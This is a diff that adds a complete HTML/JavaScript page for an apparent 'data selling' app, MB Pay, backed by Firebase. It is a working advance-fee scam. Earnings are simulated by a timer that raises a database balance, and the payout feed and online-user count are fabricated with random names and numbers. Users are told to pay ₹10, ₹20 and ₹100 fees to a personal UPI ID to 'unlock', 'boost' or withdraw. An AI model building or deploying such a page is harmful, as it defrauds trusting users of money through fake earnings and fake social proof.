@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>data selling app - data selling app</title>
+    
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
+    
+    <style>
+        :root { 
+            --primary: #00ff88; 
+            --secondary: #6366f1; 
+            --bg: #030712; 
+            --glass: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --accent: #f59e0b;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
+        
+        body { 
+            background: var(--bg); 
+            color: white; 
+            overflow-x: hidden; 
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* --- PREMIUM BACKGROUND ANIMATION --- */
+        .bg-blobs { position: fixed; inset: 0; z-index: -1; overflow: hidden; filter: blur(80px); }
+        .blob { position: absolute; width: 300px; height: 300px; border-radius: 50%; opacity: 0.4; animation: move 20s infinite alternate; }
+        .blob-1 { background: var(--secondary); top: -10%; left: -10%; }
+        .blob-2 { background: #8b5cf6; bottom: -10%; right: -10%; animation-delay: -5s; }
+        .blob-3 { background: #0ea5e9; top: 40%; left: 30%; animation-duration: 25s; }
+        @keyframes move { from { transform: translate(0,0) scale(1); } to { transform: translate(100px, 100px) scale(1.2); } }
+
+        /* --- UI COMPONENTS --- */
+        #loader { position: fixed; inset: 0; background: var(--bg); z-index: 9999; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 1.5rem; letter-spacing: 2px; }
+        
+        .page { display: none; padding: 20px; padding-bottom: 120px; min-height: 100vh; animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); }
+        .active-page { display: block; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+        .glass { 
+            background: var(--glass); 
+            backdrop-filter: blur(25px); 
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid var(--glass-border); 
+            border-radius: 32px; 
+            padding: 24px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            margin-bottom: 20px;
+        }
+
+        .gradient-text { background: linear-gradient(135deg, #00ff88, #60a5fa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; }
+        
+        .header-top { 
+            display: flex; justify-content: space-between; align-items: center; 
+            padding: 20px; position: sticky; top: 0; z-index: 1000;
+            background: rgba(3, 7, 18, 0.4); backdrop-filter: blur(10px);
+        }
+        .online-count { background: rgba(0, 255, 136, 0.1); color: var(--primary); padding: 6px 14px; border-radius: 50px; font-size: 11px; font-weight: 700; border: 1px solid rgba(0, 255, 136, 0.2); }
+
+        .btn { width: 100%; padding: 18px; border-radius: 20px; border: none; font-weight: 800; cursor: pointer; transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); font-size: 16px; margin-top: 10px; color: white; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn-primary { background: linear-gradient(135deg, #00ff88, #3b82f6); box-shadow: 0 10px 20px rgba(0, 255, 136, 0.2); }
+        .btn-boost { background: linear-gradient(135deg, #f59e0b, #ef4444); }
+        .btn:active { transform: scale(0.94); }
+        
+        input { width: 100%; padding: 18px; background: rgba(255,255,255,0.05); border: 1px solid var(--glass-border); border-radius: 18px; color: white; margin-bottom: 15px; font-size: 16px; transition: 0.3s; }
+        input:focus { border-color: var(--primary); background: rgba(255,255,255,0.08); }
+
+        /* Progress Bar Premium */
+        .progress-container { width: 100%; height: 10px; background: rgba(255,255,255,0.05); border-radius: 20px; margin: 15px 0; overflow: hidden; }
+        .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #00ff88, #60a5fa); transition: 0.8s cubic-bezier(0.4, 0, 0.2, 1); box-shadow: 0 0 15px var(--primary); }
+
+        /* Global Feed Items */
+        .payout-item { display: flex; align-items: center; justify-content: space-between; padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.02); }
+        .payout-avatar { width: 36px; height: 32px; border-radius: 12px; background: linear-gradient(135deg, #3b82f6, #6366f1); display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 800; }
+
+        /* Bottom Navigation */
+        .nav { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(3, 7, 18, 0.8); backdrop-filter: blur(20px); border-top: 1px solid var(--glass-border); display: none; justify-content: space-around; padding: 15px; z-index: 2000; }
+        .nav-item { color: #4b5563; font-size: 10px; text-align: center; cursor: pointer; background: none; border: none; font-weight: 700; transition: 0.3s; width: 18%; }
+        .nav-item.active { color: var(--primary); transform: translateY(-5px); }
+
+        /* Modals */
+        #name-modal, #offline-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 5000; display: none; align-items: center; justify-content: center; padding: 25px; backdrop-filter: blur(15px); }
+
+        @keyframes pulse { from { opacity: 1; transform: scale(1); } to { opacity: 0.5; transform: scale(1.05); } }
+    </style>
+</head>
+<body onload="initApp()">
+
+    <!-- BACKGROUND BLOBS -->
+    <div class="bg-blobs">
+        <div class="blob blob-1"></div>
+        <div class="blob blob-2"></div>
+        <div class="blob blob-3"></div>
+    </div>
+
+    <div id="loader"><span class="gradient-text">data selling app..</span></div>
+
+    <div id="offline-modal">
+        <div class="glass" style="text-align: center;">
+            <div style="font-size: 60px;">🔌</div>
+            <h2 class="gradient-text">Offline Mode</h2>
+            <p style="margin: 15px 0; opacity: 0.7;">Internet connection is required to sync with the mesh node.</p>
+        </div>
+    </div>
+
+    <!-- Top Header -->
+    <div id="top-header" class="header-top" style="display: none;">
+        <b style="font-size: 22px; letter-spacing: -1px;" class="gradient-text">sell data</b>
+        <div class="online-count">● <span id="live-online-users">5,142</span> ONLINE</div>
+    </div>
+
+    <!-- UPDATE NAME MODAL -->
+    <div id="name-modal">
+        <div class="glass" style="width: 100%;">
+            <h3 style="margin-bottom: 20px;">Identity Settings</h3>
+            <input type="text" id="new-username" placeholder="Enter custom name">
+            <div style="display: flex; gap: 12px;">
+                <button class="btn" style="background: rgba(255,255,255,0.05);" onclick="closeNameModal()">Cancel</button>
+                <button class="btn btn-primary" onclick="saveNewName()">Save Profile</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- VIEW: AUTH -->
+    <div id="view-auth" class="page active-page" style="padding-top: 80px;">
+        <div style="text-align: center; margin-bottom: 50px;">
+            <h1 class="gradient-text" style="font-size: 4.5rem; letter-spacing: -2px;">MB Pay</h1>
+            <p style="opacity: 0.5; font-size: 14px; font-weight: 600;">ENCRYPTED P2P CLOUD ENGINE</p>
+        </div>
+        <div class="glass">
+            <h3 style="margin-bottom: 20px; font-weight: 800;">Welcome back</h3>
+            <input type="email" id="g-email" placeholder="Gmail Address">
+            <input type="password" id="g-pass" placeholder="Secure Password">
+            <button class="btn btn-primary" onclick="handleEmailAuth()">Access Node</button>
+            <p style="text-align: center; margin-top: 25px; font-size: 14px; opacity: 0.6;" onclick="toggleAuth()">
+                <span id="toggle-msg">New Member? <b>Create Account</b></span>
+            </p>
+        </div>
+    </div>
+
+    <!-- VIEW: DASHBOARD -->
+    <div id="view-dash" class="page">
+        <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 30px;">
+            <img id="u-img" src="" style="width:55px; height:55px; border-radius:18px; border:2px solid var(--primary); object-fit: cover;">
+            <div>
+                <div style="display: flex; align-items: center; gap: 8px;">
+                    <h3 id="u-name" style="font-weight: 800;">User</h3>
+                    <span onclick="openNameModal()" style="font-size: 18px; cursor:pointer;">⚙️</span>
+                </div>
+                <p id="u-email" style="font-size: 11px; opacity: 0.4; font-weight: 600;"></p>
+            </div>
+        </div>
+        
+        <div class="glass" style="background: linear-gradient(135deg, rgba(255,255,255,0.05), rgba(255,255,255,0.01));">
+            <p style="font-size: 12px; opacity: 0.6; font-weight: 600; text-transform: uppercase;">Available Revenue</p>
+            <h1 style="font-size: 3.5rem; margin: 5px 0; letter-spacing: -2px;">₹<span id="bal">0.00</span></h1>
+            <div class="progress-container"><div class="progress-bar" id="p-bar"></div></div>
+            <div style="display: flex; justify-content: space-between; font-size: 11px; font-weight: 700;">
+                <span id="mb-txt" style="opacity:0.6">0/100 MB</span>
+                <span style="color: var(--primary);">ACTIVE CLOUD</span>
+            </div>
+        </div>
+
+        <div id="boost-section" style="display: none;">
+            <div class="glass" style="border-color: var(--accent); background: rgba(245, 158, 11, 0.05);">
+                <p style="font-size: 13px; text-align: center; font-weight: 600;">Daily limit reached. Upgrade to 200MB.</p>
+                <button class="btn btn-boost" onclick="showView('view-boost')">Boost Node Now</button>
+            </div>
+        </div>
+
+        <button class="btn btn-primary" onclick="showView('view-sell')">🚀 START EARNING SESSION</button>
+
+        <div style="margin-top: 40px;">
+            <h4 style="font-size: 14px; opacity: 0.5; margin-bottom: 15px; font-weight: 800;">GLOBAL LIVE ACTIVITY</h4>
+            <div class="glass" id="global-list" style="padding: 10px; max-height: 300px; overflow: hidden;"></div>
+        </div>
+    </div>
+
+    <!-- VIEW: SELLING -->
+    <div id="view-sell" class="page" style="text-align: center;">
+        <div id="sell-locked">
+            <h2 class="gradient-text">Earning Locked</h2>
+            <div class="glass" style="margin-top: 25px;">
+                <p style="margin-bottom: 25px; opacity: 0.7;">Device identification fee (₹10) required to link node.</p>
+                <img src="https://i.ibb.co/PvfFBRh1/IMG-20260520-205523.png" style="width: 200px; border-radius: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
+                <p style="margin: 20px 0; color: var(--secondary); font-weight: 800; font-size: 18px;">sarojmanish099@okaxis</p>
+                <input type="number" id="sell-utr" placeholder="Enter 12-digit UTR">
+                <button class="btn btn-primary" id="sell-unlock-btn" onclick="submitSellUnlock()">Pay ₹10 & Unlock</button>
+            </div>
+        </div>
+
+        <div id="sell-unlocked" style="display: none;">
+            <h2 class="gradient-text" style="font-size: 2rem;">Syncing Node...</h2>
+            <div class="glass" style="margin: 40px 0; padding: 60px 0; position: relative;">
+                <div style="font-size: 80px; margin-bottom: 20px; animation: pulse 1s infinite alternate;">📡</div>
+                <h1 id="l-mb" style="font-size: 5rem; letter-spacing: -3px;">0.00</h1>
+                <div class="progress-container" style="margin: 30px;"><div class="progress-bar" id="s-bar"></div></div>
+                <h2 id="l-earn" style="color:var(--primary); font-weight: 800;">₹0.00</h2>
+            </div>
+            
+            <div id="sell-action-container">
+                <button class="btn btn-primary" id="s-btn" onclick="toggleSelling()">Resume Upload</button>
+            </div>
+            <div id="sell-boost-msg" style="display: none;">
+                <p style="color: var(--accent); font-weight: 700; margin-bottom: 15px;">Daily Mesh Capacity Full!</p>
+                <button class="btn btn-boost" onclick="showView('view-boost')">BOOST CAPACITY (+100MB)</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- VIEW: WITHDRAW -->
+    <div id="view-withdraw" class="page">
+        <h2 class="gradient-text">Withdraw</h2>
+        <div id="l-box" class="glass" style="text-align:center; margin-top:25px">
+            <p style="font-size: 16px; color: var(--primary); font-weight: 800;">⚠️ Nikasi (Withdraw) ke liye verification zaroori hai.</p>
+            <img src="https://i.ibb.co/PvfFBRh1/IMG-20260520-205523.png" style="width: 200px; margin: 25px 0; border-radius: 24px;">
+            <p style="color: var(--secondary); font-weight: 800; font-size: 18px;">sarojmanish099@okaxis</p>
+            <input type="number" id="utr" placeholder="Enter 12-digit UTR" oninput="if(this.value.length > 12) this.value = this.value.slice(0, 12);">
+            <button class="btn btn-primary" id="withdraw-link-btn" onclick="submitU()">Verify Identity (₹100)</button>
+        </div>
+        <div id="w-form" class="glass" style="display:none; margin-top: 20px;">
+            <input type="number" id="w-amt" placeholder="Amount (Min ₹100)">
+            <input type="text" id="w-upi" placeholder="Your UPI ID">
+            <button class="btn btn-primary" onclick="requestW()">Confirm Payout</button>
+        </div>
+    </div>
+
+    <!-- VIEW: POLICY -->
+    <div id="view-policy" class="page">
+        <h2 class="gradient-text">Policy</h2>
+        <div class="glass" style="margin-top: 25px;">
+            <div class="policy-section"><span class="policy-h">Digital Data Asset</span><p class="policy-p">MB Pay tunnels encrypted background data only.</p></div>
+            <div class="policy-section"><span class="policy-h">KYC Standards</span><p class="policy-p">Fees are used for UPI mapping and server costs.</p></div>
+        </div>
+    </div>
+
+    <!-- VIEW: BOOST -->
+    <div id="view-boost" class="page">
+        <h2 class="gradient-text">Boost Capacity</h2>
+        <div class="glass" style="text-align: center; margin-top: 25px;">
+            <p style="font-weight: 600; margin-bottom: 20px;">Add extra 100MB node capacity today.</p>
+            <img src="https://i.ibb.co/PvfFBRh1/IMG-20260520-205523.png" style="width: 200px; border-radius: 24px;">
+            <p style="margin: 20px 0; color: var(--secondary); font-weight: 800;">sarojmanish099@okaxis</p>
+            <input type="number" id="boost-utr" placeholder="Enter ₹20 UTR">
+            <button class="btn btn-primary" id="boost-btn" onclick="submitBoost()">Verify Boost Payment</button>
+        </div>
+    </div>
+
+    <!-- NAV -->
+    <nav class="nav" id="main-nav">
+        <button class="nav-item" id="nav-dash" onclick="showView('view-dash')">🏠<br>HOME</button>
+        <button class="nav-item" id="nav-sell" onclick="showView('view-sell')">📡<br>SYNC</button>
+        <button class="nav-item" id="nav-policy" onclick="showView('view-policy')">📜<br>TERMS</button>
+        <button class="nav-item" id="nav-withdraw" onclick="showView('view-withdraw')">💰<br>PAYOUT</button>
+        <button class="nav-item" onclick="logout()">🚪<br>EXIT</button>
+    </nav>
+
+    <script>
+        // --- FIREBASE CONFIG (APNA DATA YAHA BHAREIN) ---
+        const firebaseConfig = {
+  apiKey: "AIzaSyC9rofI7wES-z9cncI1fTw5vUrNm3TAUVw",
+  authDomain: "data-sell-app-e93f7.firebaseapp.com",
+  databaseURL: "https://data-sell-app-e93f7-default-rtdb.firebaseio.com",
+  projectId: "data-sell-app-e93f7",
+  storageBucket: "data-sell-app-e93f7.firebasestorage.app",
+  messagingSenderId: "529844972304",
+  appId: "1:529844972304:web:6fd35dc545dfc4bef4d395"
+};
+
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth(); const db = firebase.database();
+        let uData = null; let sInt = null; let isLogin = true; let currentView = 'view-auth';
+
+        // --- HAPTIC SOUND EFFECT ---
+        const playClick = () => {
+            const context = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = context.createOscillator();
+            const gain = context.createGain();
+            osc.connect(gain); gain.connect(context.destination);
+            osc.type = 'sine'; osc.frequency.setValueAtTime(800, context.currentTime);
+            gain.gain.setValueAtTime(0.1, context.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.01, context.currentTime + 0.1);
+            osc.start(); osc.stop(context.currentTime + 0.1);
+        };
+
+        const diverseNames = ["Md. Arshad", "Rahul Sharma", "Sajid Khan", "Priya Verma", "Irfan Malik", "Anjali Gupta", "Zaid Ahmed", "Sumit Singh", "Fatima Bi", "Deepak Kumar", "Rizwan Shah", "Neha Das", "Sunita T.", "Md. Rizwan", "Monty", "vikky ", "Udayraj", "Manshi", "qween", "Nadeem Khan ", "Ghanshyam ", "Ranjeet K..","Surjeet ", "Adarsh", "Abhishek ", "Balram ", "ankitKumar ", "Monuali", "Amardeep Singh"]; 
+
+        function initApp() {
+            const list = document.getElementById('global-list');
+            for(let i=0; i<8; i++) addFakePayout(true);
+            setInterval(addFakePayout, 6000);
+            setInterval(() => { document.getElementById('live-online-users').innerText = (5000 + Math.floor(Math.random()*900)).toLocaleString(); }, 3500);
+            window.addEventListener('online', netCheck); window.addEventListener('offline', netCheck); netCheck();
+            
+            // Add sound to all buttons
+            document.querySelectorAll('button, .nav-item').forEach(el => {
+                el.addEventListener('click', playClick);
+            });
+        }
+
+        function netCheck() {
+            document.getElementById('offline-modal').style.display = navigator.onLine ? 'none' : 'flex';
+            if(!navigator.onLine && sInt) stopSelling();
+        }
+
+        function handleEmailAuth() {
+            const email = document.getElementById('g-email').value;
+            const pass = document.getElementById('g-pass').value;
+            if(!email.includes('@') || pass.length < 6) return alert("Valid credentials required.");
+            document.getElementById('loader').style.display = 'flex';
+            if(isLogin) {
+                auth.signInWithEmailAndPassword(email, pass).then(r => sync(r.user.uid)).catch(e => { alert(e.message); document.getElementById('loader').style.display = 'none'; });
+            } else {
+                auth.createUserWithEmailAndPassword(email, pass).then(r => {
+                    db.ref('users/'+r.user.uid).set({ name: email.split('@')[0], email, photo: "https://ui-avatars.com/api/?name="+email+"&background=6366f1&color=fff", balance: 0, mbSold: 0, isUnlocked: false, isSellUnlocked: false, dailyLimit: 100, lastDate: new Date().toLocaleDateString() });
+                    sync(r.user.uid);
+                }).catch(e => { alert(e.message); document.getElementById('loader').style.display = 'none'; });
+            }
+        }
+
+        function sync(uid) {
+            db.ref('users/'+uid).on('value', s => {
+                uData = s.val(); uData.uid = uid;
+                const today = new Date().toLocaleDateString();
+                if(uData.lastDate !== today) { db.ref('users/'+uid).update({ mbSold: 0, lastDate: today, dailyLimit: 100 }); return; }
+                document.getElementById('loader').style.display = 'none';
+                updateUI();
+                if(currentView === 'view-auth') showView('view-dash');
+            });
+        }
+
+        function updateUI() {
+            if(!uData) return;
+            const limit = uData.dailyLimit || 100;
+            document.getElementById('u-name').innerText = uData.name;
+            document.getElementById('u-email').innerText = uData.email;
+            document.getElementById('u-img').src = uData.photo;
+            document.getElementById('bal').innerText = uData.balance.toFixed(2);
+            document.getElementById('mb-txt').innerText = uData.mbSold.toFixed(1) + "/" + limit + " MB";
+            document.getElementById('p-bar').style.width = Math.min((uData.mbSold / limit) * 100, 100) + "%";
+            
+            document.getElementById('boost-section').style.display = (uData.mbSold >= limit) ? 'block' : 'none';
+            if(uData.isUnlocked) { document.getElementById('l-box').style.display = 'none'; document.getElementById('w-form').style.display = 'block'; }
+            if(uData.isSellUnlocked) { document.getElementById('sell-locked').style.display = 'none'; document.getElementById('sell-unlocked').style.display = 'block'; }
+            
+            if(currentView === 'view-sell' && uData.isSellUnlocked) {
+                document.getElementById('l-mb').innerText = uData.mbSold.toFixed(2);
+                document.getElementById('l-earn').innerText = "Revenue: ₹" + (uData.mbSold * 0.40).toFixed(2);
+                document.getElementById('s-bar').style.width = Math.min((uData.mbSold / limit) * 100, 100) + "%";
+                if(uData.mbSold >= limit) {
+                    document.getElementById('sell-action-container').style.display = 'none';
+                    document.getElementById('sell-boost-msg').style.display = 'block';
+                } else {
+                    document.getElementById('sell-action-container').style.display = 'block';
+                    document.getElementById('sell-boost-msg').style.display = 'none';
+                }
+            }
+        }
+
+        function toggleSelling() {
+            if(!navigator.onLine) return alert("Connect to Internet!");
+            const limit = uData.dailyLimit || 100;
+            if(sInt) { stopSelling(); return; }
+            if(uData.mbSold >= limit) return;
+            document.getElementById('s-btn').innerText = "STOP NODE";
+            sInt = setInterval(() => {
+                if(uData.mbSold >= limit) { stopSelling(); return; }
+                db.ref('users/'+uData.uid).update({ mbSold: uData.mbSold + 0.5, balance: uData.balance + 0.2 });
+            }, 1000);
+        }
+
+        function stopSelling() { clearInterval(sInt); sInt = null; document.getElementById('s-btn').innerText = "RESUME NODE"; }
+
+        function utrVerify(val, ref, btnId) {
+            if(val.length !== 12) { alert("Galat UTR! UPI UTR 12 ank ka hota hai."); return false; }
+            db.ref(ref).push({ uid: uData.uid, email: uData.email, utr: val, time: new Date().toLocaleString() });
+            document.getElementById(btnId).innerText = "PENDING...";
+            alert("UTR submitted! Verification starts now.");
+            return true;
+        }
+
+        function submitSellUnlock() { utrVerify(document.getElementById('sell-utr').value, 'sell_reqs', 'sell-unlock-btn'); }
+        function submitBoost() { utrVerify(document.getElementById('boost-utr').value, 'boost_reqs', 'boost-btn'); }
+        function submitU() { utrVerify(document.getElementById('utr').value, 'withdraw_reqs', 'withdraw-link-btn'); }
+
+        function showView(v) {
+            currentView = v;
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
+            document.getElementById(v).classList.add('active-page');
+            document.getElementById('main-nav').style.display = (v === 'view-auth') ? 'none' : 'flex';
+            document.getElementById('top-header').style.display = (v === 'view-auth') ? 'none' : 'flex';
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            const map = {'view-dash':'nav-dash', 'view-sell':'nav-sell', 'view-policy':'nav-policy', 'view-withdraw':'nav-withdraw'};
+            if(map[v]) document.getElementById(map[v]).classList.add('active');
+            updateUI();
+        }
+
+        function addFakePayout(isInitial = false) {
+            const list = document.getElementById('global-list');
+            const name = diverseNames[Math.floor(Math.random() * diverseNames.length)];
+            const item = document.createElement('div');
+            item.className = 'payout-item';
+            item.innerHTML = `<div style="display:flex;align-items:center;gap:12px"><div class="payout-avatar">${name[0]}</div><div><b>${name}</b><br><span style="font-size:9px;opacity:0.4">NODE VERIFIED</span></div></div><div style="color:var(--primary);font-weight:800;">₹${(Math.floor(Math.random()*600)+150)}</div>`;
+            if(isInitial) list.appendChild(item); else { list.insertBefore(item, list.firstChild); if(list.children.length > 7) list.removeChild(list.lastChild); }
+        }
+
+        function requestW() {
+            const amt = parseFloat(document.getElementById('w-amt').value);
+            if(amt < 100 || amt > uData.balance) return alert("Error in data.");
+            db.ref('withdraws').push({ uid: uData.uid, name: uData.name, email: uData.email, amt, upi: document.getElementById('w-upi').value, status: 'pending' });
+            db.ref('users/'+uData.uid).update({ balance: uData.balance - amt }); alert("Success!");
+        }
+
+        function logout() { auth.signOut().then(() => location.reload()); }
+        function openNameModal() { document.getElementById('name-modal').style.display = 'flex'; }
+        function closeNameModal() { document.getElementById('name-modal').style.display = 'none'; }
+        function saveNewName() { db.ref('users/'+uData.uid).update({ name: document.getElementById('new-username').value }); closeNameModal(); }
+        function toggleAuth() { isLogin = !isLogin; document.getElementById('auth-btn').innerText = isLogin ? "Secure Login" : "Create Node"; }
+        
+        auth.onAuthStateChanged(u => { if(u) sync(u.uid); else document.getElementById('loader').style.display = 'none'; });
+    </script>
+</body>
+</html>
